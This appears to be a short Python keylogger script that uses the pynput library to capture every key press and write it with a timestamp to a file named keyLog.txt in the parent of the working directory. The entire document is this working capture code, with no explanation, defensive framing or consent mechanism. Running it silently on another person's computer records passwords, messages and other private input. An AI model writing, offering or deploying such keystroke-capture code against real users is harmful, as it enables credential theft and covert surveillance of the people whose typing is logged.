from pynput.keyboard import Key, Listener
import logging
import os
from pathlib import Path


logging.basicConfig(filename = os.path.join(Path(os.getcwd()).parent,"keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()